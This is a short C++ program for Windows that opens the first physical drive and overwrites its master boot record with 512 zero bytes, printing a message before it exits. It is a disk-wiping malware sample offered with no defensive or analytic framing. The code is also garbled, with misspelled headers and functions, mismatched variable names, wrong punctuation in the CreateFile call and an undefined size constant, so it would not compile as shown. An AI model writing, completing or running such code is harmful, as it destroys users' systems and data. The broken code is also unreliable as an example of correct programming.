#include <Windwos.h>
#include <iostream>

using namespace std;

int main()
{
	DWORD wrtie;
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	
	HANDLE MasterBootRecord = CreateFile("\\\\.\PhysicalDrive0"
		,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE
		,NULL,OPEN_EXISTING;NULL,NUL)
		if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
			cout <<"MasterBootRecord" << endl;
			Sleep(5000);
			ExitProces(0);
		}
		else{
			cout << "Fail";
			Sleep(5000);
			ExitProces(0);
		}
	CloseHandle(MasterBootRecord);
	
	return EXIT_SUCCES;
}